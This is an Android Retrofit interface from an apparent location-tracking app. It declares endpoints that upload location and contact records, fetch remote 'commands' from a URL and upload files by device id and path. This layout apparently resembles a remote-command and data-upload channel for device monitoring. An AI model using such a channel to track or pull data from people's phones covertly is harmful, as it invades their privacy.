package com.varbin.locationtracker.APIs;

import android.os.Build;

import java.util.List;

import callDetails.inActiveCommand;
import models.AttrModel;
import models.FileUpload;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.GET;
import retrofit2.http.HEAD;
import retrofit2.http.Header;
import retrofit2.http.Headers;
import retrofit2.http.POST;
import retrofit2.http.Path;
import retrofit2.http.Query;
import retrofit2.http.Url;
import synceAdapter.AccountConstants;

public interface MyInterface {

    @POST("createLocation")
    Call<ModelClass> createLocation (@Body ModelClass modelClass);

    @POST("createContactPerson")
    Call<ContactModel> createContact (@Body ContactModel contactModel);

    @GET
    Call<List<AttrModel>> getCommand(@Url String url);
    @GET
    Call<inActiveCommand> inActiveCommand(@Url String url);

    @POST("setCommandFile")
    Call<FileUpload> sendData2 ( @Body FileUpload fileUpload);
    @FormUrlEncoded
    @POST("setCommandFile")
    Call<FileUpload> sendData (@Field("postcommand") String postcommand , @Field("device_id") String id ,@Field("path") String extra ,@Field("file_date_time") String file_date_time );
}

